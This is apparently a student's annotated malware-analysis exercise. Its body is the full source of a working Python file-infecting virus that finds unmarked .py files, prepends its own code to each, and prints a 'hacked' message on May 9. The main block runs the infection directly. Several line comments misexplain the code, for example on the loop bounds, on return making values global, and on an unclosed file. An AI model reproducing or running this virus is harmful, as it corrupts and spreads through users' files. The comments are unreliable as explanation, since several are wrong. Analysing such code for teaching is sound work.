# Script:                       Op Challenge 14
# Author:                       Courtney Hans
# Date of latest revision:      9/17/20
# Purpose:                      Python Malware Analysis on someone else's code

# ********DO NOT RUN THIS CODE, for analysis purposes only*******************

# importing the operating system library and datetime module (allows the code to work with dates as date objects)
import os
import datetime

# Declaration of variables

SIGNATURE = "VIRUS" # putting a string containing the word "VIRUS" into the global variable called SIGNATURE

# Declaration of functions

# creating a function to crawl through directories and files to build a target list of python files
def locate(path): # naming/building a function named 'locate' to be executed with parameter 'path'
    files_targeted = [] # creating an empty list called 'files_targeted'
    filelist = os.listdir(path) # using the os library, return a list containing the names of the entries in the specifed path (directory) and puts it in list named 'filelist'
    for fname in filelist: # for loop to execute a set of statements against each item (fname) in list 'filelist'
        if os.path.isdir(path+"/"+fname): # if the path finds a directory, execute the following:
            files_targeted.extend(locate(path+"/"+fname)) # extend the list "files_targeted" by adding the files found in the directory
        elif fname[-3:] == ".py": #if the above statement (line 21) is not true (target is a file, not a directory), then check if the last 3 characters in the filename contain the extension ".py" (basically, is a python script)
            infected = False # then make local variable 'infected' equal to boolean value False
            for line in open(path+"/"+fname): #scan through and open the files
                if SIGNATURE in line: # if the variable 'SIGNATURE' is any of the lines, execture lines 27 & 28
                    infected = True # change value of variable 'infected' to boolean value True
                    break # break out of the if statment block started on line 26
            if infected == False: # if the boolean value of variable 'infected' is false, execute line 30
                files_targeted.append(path+"/"+fname) # append/change the 'files_targeted' list with that file name
    return files_targeted # return the value/contents of the list 'files_targeted' and exit the function named 'locate' (this makes it globally accessible)

#creating a function to 'infect' the files in the list of python files built above by writing something 38 times
def infect(files_targeted): # naming/building a function named 'infect' to be executed with parameter 'files_targeted'
    virus = open(os.path.abspath(__file__)) # creating a local list named "virus" and in it is opening the files from the parameter 'files_targeted' as objects and changing it's pathway from a relative to an absolute path
    virusstring = "" # creating a local variable named 'virusstring' and putting an empty string into it
    for i,line in enumerate(virus): # for loop with index 'i', that loops over the list 'virus' and retrieves both the index number and the value of each item
        if i&gt;=0 and i &lt;39: # if i (index) is greater than 0 and less than 39, execute line 37
            virusstring += line # cumulatively add the new value of 'line' to the list 'virusstring'
    virus.close # close the parser (virus) with the 'close' method
    for fname in files_targeted: # for each item (file) in the list 'files_targeted'
        f = open(fname) # open the file and park it in a local variable named "f"
        temp = f.read() # read the files contents into the local variable named "temp"
        f.close() # close the file
        f = open(fname,"w") # open the file in write mode
        f.write(virusstring + temp) # open the file and overwrite it with the contents of variables viruststring and temp 
        f.close() # close the file

# function to prep detonation of the virus at a predetermined time (in this case, when the date hits May 9. According to scenario, Hackers then also tampered with teh system clocks to affect detonation.)
def detonate(): # naming/building a function named 'detonate'
    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9: # if statement checking to see if the date is May 9, if so, execute line #49
        print "You have been hacked" # print the sentence "You have been hacked" into the files specified in the script

# Main 

files_targeted = locate(os.path.abspath("")) # putting value of locate(os.path.abspath("")) into the parameter 'files_targeted' to be passed in as the function argument on the following line
infect(files_targeted) # calling/executing the function named 'infect' with the argument 'files_targeted'
detonate() #calling/executing the function named 'detonate'

# End